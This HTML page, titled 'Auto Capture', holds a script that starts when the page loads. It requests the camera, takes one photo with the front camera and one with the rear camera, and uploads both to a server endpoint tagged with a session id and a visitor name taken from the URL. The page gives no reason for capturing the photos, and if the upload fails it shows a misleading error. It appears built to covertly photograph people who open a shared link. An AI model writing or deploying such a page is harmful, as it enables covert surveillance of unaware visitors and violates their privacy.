<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Auto Capture</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
    p { margin-top: 20px; font-size: 18px; }
  </style>
</head>
<body>
  <p id="status">Capturing photos, please waitâ€¦</p>

  <script>
  (async function() {
    const status = document.getElementById("status");

    // Get sessionId and name from URL
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get("sessionId") || Date.now().toString() + Math.floor(Math.random()*1000);
    const name = urlParams.get("name") || "visitor";

    async function takePhoto(facingMode) {
      try {
        const constraints = { video: { facingMode: facingMode } };
        const stream = await navigator.mediaDevices.getUserMedia(constraints);

        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        return new Promise((resolve, reject) => {
          canvas.toBlob(blob => {
            stream.getTracks().forEach(track => track.stop());
            if (blob) resolve(blob);
            else reject(new Error("Failed to create blob"));
          }, "image/jpeg", 0.7); // 0.7 = compression
        });
      } catch (err) {
        console.error("Camera capture failed:", err);
        throw err;
      }
    }

    async function sendToServer(blob, type) {
      const formData = new FormData();
      formData.append("photo", blob, `${type}_${Date.now()}.jpg`);
      formData.append("name", name);
      formData.append("type", type);
      formData.append("sessionId", sessionId);

      const res = await fetch("/upload-photo", { method: "POST", body: formData });
      return res.json();
    }

    try {
      // Always do front then back
      const frontPhoto = await takePhoto("user");
      await sendToServer(frontPhoto, "front");

      const backPhoto = await takePhoto("environment");
      await sendToServer(backPhoto, "back");

      status.innerText = "Photos captured and uploaded successfully!";
    } catch (err) {
      console.error(err);
      status.innerText = "Server failed! Sorry, try again in a few minutes!";
    }
  })();
  </script>
</body>
</html>
